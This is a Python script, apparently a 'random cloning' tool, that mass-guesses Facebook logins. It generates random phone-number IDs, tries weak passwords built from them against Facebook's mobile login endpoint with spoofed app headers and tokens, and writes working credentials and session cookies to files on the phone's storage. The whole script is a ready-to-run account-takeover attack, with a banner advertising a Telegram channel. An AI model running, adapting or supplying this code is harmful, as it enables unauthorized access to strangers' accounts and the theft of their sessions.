import os
import sys
import json
import uuid
import string
import random
import os,time,random,string,re,sys,requests,json,uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
gtxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
gt=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
try:os.system("pkg install espeak")
except:pass
os.system("git pull")
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:pass
proxsi=open('socksku.txt','r').read().splitlines()
#__end proxy___
try:
    import requests 
except ImportError:
    print(f'\x1b[38;5;46m[\033[38;5;46m=\x1b[38;5;46m] INSTALLING REQUESTS ')
    os.system('pip install requests')              
from concurrent.futures import ThreadPoolExecutor as tred
class Mr_Code:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.gen = []    

#_______________<logo>_____________        
        
    def banner(self):
        os.system("clear")
        os.system("xdg-open https://t.me/arjokerofficial_03")
        print("""
\x1b[1;92m▶𝗔𝗥
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\033[34;1m┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴
\033[34;1m┴┬┴┬┴┬┴┬┴┬┴┬┴┬\033[38;5;46m░▀▀█\x1b[38;5;196m▶︎\033[38;5;46m░█▀█\x1b[38;5;196m▶\033[38;5;46m︎░█░█\x1b[38;5;196m▶︎\033[38;5;46m░█▀▀\x1b[38;5;196m▶︎\033[38;5;46m░█▀▄\033[34;1m┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴
\033[34;1m┬┴┬┴┬┴┬┴┬┴┬┴┬┴\033[38;5;46m░░░█\x1b[38;5;196m▶\033[38;5;46m︎░█░█\x1b[38;5;196m▶︎\033[38;5;46m░█▀▄\x1b[38;5;196m▶︎\033[38;5;46m░█▀▀\x1b[38;5;196m▶︎\033[38;5;46m░█▀▄\033[34;1m┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬
\033[34;1m┴┬┴┬┴┬┴┬┴┬┴┬┴┬\033[38;5;46m░▀▀░\x1b[38;5;196m▶︎\033[38;5;46m░▀▀▀\x1b[38;5;196m▶︎\033[38;5;46m░▀░▀\x1b[38;5;196m▶︎\033[38;5;46m░▀▀▀\x1b[38;5;196m▶︎\033[38;5;46m░▀░▀\033[34;1m┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴
\033[34;1m┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴┬┴    
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛   
\x1b[1;96m▶︎WINNERS FOCUS ON WINNING, LOSERS FOCUS ON WINNERS◀︎
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━             
\033[1;35m  AUTHOR    : \033[38;5;46m𝗥𝗜𝗗𝗢𝗬 𝘅 𝗝𝗢𝗞𝗘𝗥
\033[1;35m  TOOL NAME : \033[38;5;46mRANDOM CLONING
\033[1;35m  TOOL TYPE : \033[38;5;46mFREE
\033[1;35m  VERSION   : \033[1;34m0.1 
\033[1;35m  STATUS    : \033[1;34m𝗪I𝗙I + 𝗗𝗔𝗧𝗔
\x1b[1;96m╔══════━━━━━━━━━━━━━━━━━━━━━━━━━━━━══════╗
\x1b[1;37mAFTER EVERY 5 MINUTE  ON/OFF AIRPLANE MODE
\x1b[1;96m╔══════━━━━━━━━━━━━━━━━━━━━━━━━━━━━══════╝
\x1b[1;36m○●○●○●○● 𝗡 𝗘 𝗩 𝗘 𝗥  𝗚 𝗜 𝗩 𝗘  𝗨 𝗣 ○●○●○●○●
\x1b[1;96m╚══════━━━━━━━━━━━━━━━━━━━━━━━━━━━━══════╝""")       
#__________________________<>__________________________        
    
    def Main(self):
        self.banner()
        code = input("\033[1;35m【𝟭】\x1b[1;96mRANDOM CLONING : ")
        code = input("\033[1;35m【✦】\x1b[1;96m𝟬𝟭𝟳 - 𝟬𝟭𝟴 - 𝟬𝟭𝟵 : ")
        limit = int(input("\033[1;35m【✦】\x1b[1;96m𝟭𝟬𝟬𝟬 - 𝟱𝟬𝟬𝟬 - 𝟭𝟬𝟬𝟬𝟬 - 𝟱𝟬𝟬𝟬𝟬 : "))
        for a in range(limit):
            xxx = "".join(random.choice(string.digits) for _ in range(8))
            self.gen.append(xxx)
        with tred(max_workers=30) as randx:
            print("\033[38;5;46mAR-RIDOY")           
            for love in self.gen:
                ids = code + love
                passlist = [ids,ids[:8],ids[:7],ids[:6],love,love[1:],love[2:],"i love you","12345678"]
                randx.submit(self.method,ids,passlist)
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")        
        print("\n")
        print("\033[38;5;46m••••••••••••••••••••••••")    
    def method(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\033[mAR-RIDOY {self.loop}|ARX|OK:-{len(self.oks)}|CP:-{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
                'adid':str(uuid.uuid4()),
                'format':'json',
                'device_id':str(uuid.uuid4()),
                'email':ids,
                'password':pas,
                'generate_analytics_claims':'1',
                'community_id':'',
                'cpl':'true',
                'try_num':'1',
                'family_device_id':str(uuid.uuid4()),
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'currently_logged_in_userid':'0',
                'locale':'en_US',
                'client_country_code':'US',
                'fb_api_req_friendly_name':'authenticate',
                'api_key':'882a8490361da98702bf97a021ddc14d',
                'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                head = {
                'User-Agent': ____uax____(),
                'Accept-Encoding':'gzip, deflate',
                'Connection':'close',
                'Content-Type':'application/x-www-form-urlencoded',
                'Host':'graph.facebook.com',
                'X-FB-Net-HNI':str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI':str(random.randint(20000, 40000)),
                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type':'MOBILE.LTE',
                'X-Tigon-Is-Retry':'False',
                'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags':'graphservice',
                'X-FB-HTTP-Engine':'Liger',
                'X-FB-Client-IP':'True',
                'X-FB-Server-Cluster':'True',
                'x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
                url = "https://graph.facebook.com/auth/login"
                response = requests.post(url,data=data,headers=head).json()
                if "access_token" in response:
                    uid = str(response['uid'])
                    coki = ";".join(i["name"] + "=" + i["value"] for i in response["session_cookies"])
                    print(f"\r\r\x1b[38;5;46mRIDOY-OK • {uid} • {pas}")
                    open("/sdcard/RIDOY-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
                    self.oks.append(uid)
                    break
                elif "www.facebook.com" in response["error"]["message"]:
                    open("/sdcard/RIDOY-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
        except Exception as e:pass
def FOYSAL():
	android_version = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	model=random.choice(['Infinix X677','Infinix X680','Infinix X6850B','Infinix X6525','Infinix X6820','Infinix X677','Infinix X6851B','Infinix X676B','Infinix X559C','Infinix X608','Infinix X606B'])
	buildx=random.choice(['SP1A.210812.016','QP1A.190711.020','UP1A.231005.007','TP1A.220624.014','UP1A.231005.007','NRD90M','OPR1.170623.032','O11019','MRA58K'])
	fb_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_version_code = str(random.randint(10000000, 66666666))
	density = random.choice(['{density=3.0,width=1080,height=2401}','{density=3.0,width=1080,height=2161}','{density=1.5,width=1280,height=720}','{density=2.0,width=720,height=1344}','{density=1.75,width=720,height=1488}','{density=1.0,width=1066,height=552}','{density=2.0,width=480,height=854}','{density=1.5,width=1200,height=1848}','{density=1.3312501,width=1280,height=736}','{density=3.0,width=1080,height=2208}','{density=4.0,width=1440,height=2392}','{density=1.0,width=320,height=480}','{density=3.0,width=1080,height=1920}','{density=1.46875,width=720,height=1510}','{density=2.625,width=1080,height=2034}','{density=1.5,width=1200,height=1920}','{density=2.0,width=720,height=1280}','{density=2.0,width=720,height=1448}','{density=1.275,width=540,height=1071}'])	
	ua='Dalvik/2.1.0 (Linux; U; Android'+android_version+'; '+model+' Build/'+buildx+'; wv) [FBAN/FB4A;FBAV/'+fb_version+';FBPN/com.facebook.katana;FBLC/en_US;FBBV/'+fb_version_code+';FBMF/infinix;FBDV/'+model+';FBSV/'+android_version+';FBCA/arm64-v8a:null;FBDM/'+density+';FB_FW/1;]'
	return ua
def ____uax____():
	fb_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_version_code = str(random.randint(10000000, 66666666))
	density = random.choicedensity = random.choice(['1.0', '1.5', '1.7', '2.0', '2.5', '2.25', '3.0'])
	width = random.randint(720, 1440)
	height = random.randint(1080, 2560)
	fbrv = str(random.randint(000000000,999999999))
	sim_name = random.choice(['Telenor','fido','MOVO AFRICA','UFONE-PAKTel','Zong','Jazz','SCO','Jio','Vodafone','Airtel','BSNL','MTNL','Grameenphone','Robi','Banglalink','Teletalk','Telkomsel','Indosat Ooredoo','Axiata','Tri','Smartfren','China Mobile','Unicom','Telecom','Satcom','Docomo','Rakuten','IIJmio','Orange','Verizon','AT&T','T-Mobile','Sprint','Vodafone','Telefonica','EE','Orange','Three'])
	county_code = random.choice(["en_US", "en_GB"])
	android_version = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	android_model = random.choice(["RMX1945","RMX1911","RMX2193","RMX1931","RMX2170","RMX3201","RMX2180","RMX2021","RMX2020","RMX1921","RMX2156","RMX3363","RMX3081","RMX2001","RMX3263","RMX2155","RMX3195","RMX1993"])
	user_agent1 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBCR/{sim_name};FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	user_agent2 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBRV/{fbrv};FBCR/{sim_name};FBMF/huawei;FBBD/huawei;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/arm64-v8a:;]"
	user_agent1 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBRV/{fbrv};FBCR/{sim_name};FBMF/xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"
	user_agent2 = f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{fb_version_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{county_code};FBRV/{fbrv};FBCR/{sim_name};FBMF/oneplus;FBBD/oneplus;FBPN/com.facebook.katana;FBDV/{android_model};FBSV/{android_version};FBOP/1;FBCA/armeabi-v7a:armeabi;]" 
	return random.choice([user_agent1,user_agent2])       
def randua(self):
        ua1 = "[FBAN/FB4A;FBAV/343.7.6.196;FBBV/33063130;FBDM/{{density=1.4,width=1080,height=2560}};FBLC/en_US;FBRV/599430599;FBCR/Airtel;FBMF/lge;FBBD/huawei;FBPN/com.facebook.katana;FBDV/LGE;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        ua2 = "[FBAN/FB4A;FBAV/338.5.3.958;FBBV/71929970;FBDM/{{density=3.0,width=1080,height=1280}};FBLC/en_US;FBRV/598100491;FBCR/WiFi;FBMF/lge;FBBD/huawei;FBPN/com.facebook.orca;FBDV/LGE;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        ua3 = "[FBAN/FB4A;FBAV/380.3.9.501;FBBV/48707411;FBDM/{{density=2.4,width=720,height=2560}};FBLC/en_US;FBRV/246829523;FBCR/WiFi;FBMF/lge;FBBD/lge;FBPN/com.facebook.orca;FBDV/LGE;FBSV/14;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        ua4 = "[FBAN/FB4A;FBAV/362.0.1.744;FBBV/76803111;FBDM/{{density=3.4,width=1440,height=1280}};FBLC/en_US;FBRV/833555191;FBCR/unknown;FBMF/lge;FBBD/oneplus;FBPN/com.facebook.orca;FBDV/LGE;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        ua5 = "[FBAN/FB4A;FBAV/389.1.9.367;FBBV/78743941;FBDM/{{density=2.5,width=1080,height=2560}};FBLC/en_US;FBRV/541707452;FBCR/Grameenphone;FBMF/lge;FBBD/xiaomi;FBPN/com.facebook.orca;FBDV/LGE;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        max = random.choice([ua1,ua2,ua3,ua4,ua5])
        return str(max)
if __name__ == "__main__":
    Mr_Code().Main()
